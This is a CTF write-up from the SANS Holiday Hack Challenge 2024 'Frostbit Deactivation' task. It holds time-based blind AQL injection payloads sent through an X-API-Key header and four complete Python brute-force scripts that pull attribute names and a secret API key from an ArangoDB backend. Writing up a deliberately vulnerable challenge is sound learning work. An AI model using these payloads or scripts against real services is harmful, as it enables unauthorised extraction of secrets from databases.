+++ 
draft = false
date = 2025-01-26T14:59:34+01:00
title = "HHC24 - Frostbit Deactivation"
description = "Ransomware bot deactivation by hacking of python endpoint abusing AQL blind injection"
slug = ""
authors = []
tags = [
    "HHC24",
    "Sans",
    "CTF",
]
categories = [
    "Writeup",
    "Web-app hacking",
    "Python",
    "Blind Injection",
    "AQL database"
]
externalLink = ""
series = [
    "HHC24",
]
+++

## Introduction

> **This was the final challenge of HHC24.**

- For this challenge we need to put all given things together to solve this challenge. From previous session we know the next application endpoint where we must deactivate the Frostbit malware:

<https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate>

- We got a hint from one of the elves that to be able to disable the Frostbit we need to execute **BLIND** injection.

- The exploitable HEADER should be **X-API-Key** as was mentioned in previous `MQTT` broadcasts.

## Gold 🥇

Oh, to mention there is **no silver** 🥈 if you already solved the Decryption challenge!

- Let's activate the debug as we used it in previous challenge with simple adding ```?debug=true``` as parameter:
<https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true>

## AQL discovery

- By sending of ```1'``` as value in vulnerable **HEADER X-API-Key**, I got following error:

```SQL
"Timeout or error in query:\nFOR doc IN config\n FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n <other_query_lines_omitted>\n RETURN doc"
```

- I used the copilot to identify the DB vendor according to this error and it said it can be AragonDB:

```The structure of the query and the terminology used, such as "FOR doc IN config" and "FILTER," points towards it being associated with ArangoDB. ArangoDB is a multi-model NoSQL database that supports key/value, document, and graph data models.```

## Testing for BLIND Injection

- I found the SYNTAX which may trigger the sleep function:

```SQL
' or SLEEP(2) --'a
```

- According to error message I need to find the name of the KEY ```doc.<key_name_omitted>``` for later pulling its value.

## Key's name dump

### how many attributes

- First we need to determine how many attributes the ```doc``` has:

```SQL
' or LENGTH(ATTRIBUTES(doc))==4 ? SLEEP(2) : 'a
```

- Answer is ```4```.

### Length of attribute name

- We need to enumerate how many characters each attribute has:

```SQL
'or LENGTH(ATTRIBUTES(doc)[{attribute_index}])=={length} ? SLEEP(2) : 'a
```

- Answer is:

```text
Attribute 0 has length of 18
Attribute 1 has length of 4
Attribute 2 has length of 4
Attribute 3 has length of 3
```

### Guess name of the attribute

- Now we are ready to execute the bruteforce attack to find a name of each attribute.
- We need to make a AQL query using of one STRING methods, e.g. LIKE <https://docs.arangodb.com/3.12/aql/functions/string/#like>
- The AQL utilizing the LIKE method can looks like:

```SQL
' OR ATTRIBUTES(doc)[0] LIKE '{pattern}' ? SLEEP(2) : 'a
```

- Guessed name for Attribute 0: ```deactivate_api_key```

### Length of value of attribute ***deactivate_api_key***

- So far, we know the name of the attribute we can start guessing its length.
- Possible AQL:

```SQL
 ' or LENGTH(doc.deactivate_api_key})==36 ? SLEEP(2) : 'a"
 ```

- Answer: Length of 'deactivate_api_key' value: ```36```

### Guess value of the attribute

- No we have all parameters to start guessing the value of the attribute ***deactivate_api_key***
- From previous iteration and know values we can craft a AQLi payload like:

```SQL
' OR doc.deactivate_api_key LIKE '{pattern}' ? SLEEP(2) : 'a
```

- Sometimes the server is acting strange, I need to wait for next day to start with the attempt for guessing the value.
- Okay! Problem was on my VM, from HOST machine it finished without any problem and value is:

*Guessed value for 'deactivate_api_key':* ```abe7a6ad-715e-4e6a-901b-c9279a964f91```

## Finish him! 🥇

- Now we know everything we need to deactivate the API!
- Lets send GET request to <https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true> with HEADER ***X-API-Key:abe7a6ad-715e-4e6a-901b-c9279a964f91***
- Response:

```json
{
  "message": "Response status code: 200, Response body: {\"result\":\"success\",\"rid\":\"83270120-3b1c-41f3-b25b-deaa5b5d1327\",\"hash\":\"3c7b7e6287a6e797196c970017ed9ecbe2c2d7ebafce6a605b1b35e16bab431d\",\"uid\":\"46597\"}\nPOSTED WIN RESULTS FOR RID 83270120-3b1c-41f3-b25b-deaa5b5d1327",
  "status": "Deactivated"
}
```

- GLORY!!! 🥇
- My profile an achievements are visible at: <https://account.counterhack.com/user/ArmBraker>

---

## Python Scripts

- ***Disclaimer:*** belows scripts are very similar, just AQL injections are different, so it can be consolidated in one script, but how learning purposes I divided them.

### Guessing length of attributes in AQL Database

```python
import requests
import time

# Define the target URL and headers
url = 'https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true'
headers = {
    'Host': 'api.frostbit.app',
    'X-Api-Key': ""  # Placeholder for length
}

# Function to test different lengths for each attribute
def test_attribute_length(attribute_index):
    print(f"Testing length for attribute {attribute_index}...")

    # Brute force from length 1 to 40 (you can adjust this range as needed)
    for length in range(1, 40):
        payload = f"' or LENGTH(ATTRIBUTES(doc)[{attribute_index}])=={length} ? SLEEP(2) : 'a"
        #print(payload)
        headers['X-Api-Key'] = payload

        start_time = time.time()  # Record the start time of the request
        response = requests.get(url, headers=headers)

        elapsed_time = time.time() - start_time  # Calculate the response time

        if elapsed_time >= 2:  # If the response is delayed by 2 seconds, it means we've found the correct length
            print(f"Attribute {attribute_index} has length: {length}")
            return length

        time.sleep(0.5)  # Small delay between requests to avoid overloading the server

    print(f"Could not determine the length for attribute {attribute_index} in the range 1-20.")
    return None

# Function to determine the lengths of all attributes (we know there are 4 attributes)
def determine_attribute_lengths():
    attribute_lengths = []
    
    for i in range(4):  # Loop through the 4 attributes
        length = test_attribute_length(i)
        if length is not None:
            attribute_lengths.append(length)
    
    return attribute_lengths

# Main function to run the script
if __name__ == "__main__":
    print("Starting brute-force for attribute lengths...\n")
    attribute_lengths = determine_attribute_lengths()
    if attribute_lengths:
        print("\n")
        for index, length in enumerate(attribute_lengths):
            print(f"Attribute {index} has length of {length}")
    else:
        print("\nFailed to determine attribute lengths.")
```

### Guessing name of AQL's attributes

```python
import requests
import time
import string

# Define the target URL and headers
url = 'https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true'
headers = {
    'Host': 'api.frostbit.app',
    'X-Api-Key': ""  # Placeholder for the payload
}

# Function to test a single character of the attribute name
def test_character(guessed_name, character):

    # Build the payload with the current guessed_name and the new character
    pattern = guessed_name + character + "%"
    print(f"Testing pattern: '{pattern}'")
    payload = f"' OR ATTRIBUTES(doc)[0] LIKE '{pattern}' ? SLEEP(2) : 'a"
    headers['X-Api-Key'] = payload

    start_time = time.time()  # Record the start time of the request
    response = requests.get(url, headers=headers)
    elapsed_time = time.time() - start_time  # Calculate response time

    if elapsed_time >= 2:  # If response is delayed by 2 seconds, the character is correct
        print(f"Found character '{character}'!")
        return True
    return False

# Function to guess the full name of Attribute 0
def guess_attribute_name(attribute_length):
    guessed_name = ""

    for i in range(attribute_length):  # Loop for the known length of the attribute
        for character in string.ascii_letters + "_" + "!":  # Test a-z, A-Z, 0-9, and _!
            #time.sleep(2)  # Small delay to avoid overwhelming the server
            if test_character(guessed_name, character):
                guessed_name += character
                break  # Move to the next position once the correct character is found
        

    return guessed_name

# Main function
if __name__ == "__main__":
    print("Starting to guess the name of Attribute 0 using LIKE...\n")
    
    attribute_length = 18  # Length of Attribute 0
    attribute_name = guess_attribute_name(attribute_length)
    
    print(f"\nGuessed name for Attribute 0: {attribute_name}")

```

### Guessing length of value for ***attribute deactivate_api_key***

```python
import requests
import time

# Define the target URL and headers
url = 'https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true'
headers = {
    'Host': 'api.frostbit.app',
    'X-Api-Key': ""  # Placeholder for the payload
}

# Function to test the length of the 'deactivate_api_key' value
def test_value_length(value_length):
    print(f"Testing length of value for 'deactivate_api_key': {value_length}...")

    # Construct the payload to check the length of the value
    payload = f"' OR LENGTH(doc.deactivate_api_key) == {value_length} ? SLEEP(2) : 'a"
    headers['X-Api-Key'] = payload

    start_time = time.time()  # Record the start time of the request
    response = requests.get(url, headers=headers)
    elapsed_time = time.time() - start_time  # Calculate response time

    if elapsed_time >= 2:  # If response is delayed by 2 seconds, it means the length is correct
        print(f"Found value length: {value_length}")
        return True
    return False

# Function to determine the length of 'deactivate_api_key' value
def find_value_length():
    for length in range(1, 40):  # Test lengths from 1 to 40 (adjust range as needed)
        if test_value_length(length):
            return length
        time.sleep(0.5)  # Small delay to avoid overwhelming the server

    return None  # If length is not found in the specified range

# Main function
if __name__ == "__main__":
    print("Starting to find the length of 'deactivate_api_key' value...\n")
    
    value_length = find_value_length()  # Find the length of the value for 'deactivate_api_key'
    
    if value_length:
        print(f"\nLength of 'deactivate_api_key' value: {value_length}")
    else:
        print("\nFailed to determine the length of the 'deactivate_api_key' value.")

```

### Guessing value of attribute ***deactivate_api_key***

```python
import requests
import time
import string

# Define the target URL and headers
url = 'https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true'
headers = {
    'Host': 'api.frostbit.app',
    'X-Api-Key': ""  # Placeholder for the payload
}

# Function to test a single character of the 'deactivate_api_key' value
def test_character(guessed_name, character):
    print(f"Testing character '{character}' for guessed name: '{guessed_name}'...")

    pattern = guessed_name + character + "%"  # Create the pattern
    payload = f"' OR doc.deactivate_api_key LIKE '{pattern}' ? SLEEP(2) : 'a"
    headers['X-Api-Key'] = payload

    start_time = time.time()  # Record the start time of the request
    response = requests.get(url, headers=headers)
    elapsed_time = time.time() - start_time  # Calculate response time

    if elapsed_time >= 2:  # If response is delayed by 2 seconds, it means the character is correct
        print(f"Found character '{character}'!")
        return True
    return False

# Function to guess the full value of 'deactivate_api_key'
def guess_value(value_length):
    guessed_value = ""

    for i in range(value_length):  # Loop for the known length of the value
        for character in string.ascii_lowercase + string.digits + "-._":  # Test possible characters
            if test_character(guessed_value, character):
                guessed_value += character
                break  # Move to the next position once the correct character is found
        #time.sleep(0.5)  # Small delay to avoid overwhelming the server

    return guessed_value

# Main function
if __name__ == "__main__":
    print("Starting to guess the value of 'deactivate_api_key'...\n")
    
    value_length = 36  # Length of 'deactivate_api_key' value
    guessed_value = guess_value(value_length)
    
    print(f"\nGuessed value for 'deactivate_api_key': {guessed_value}")
```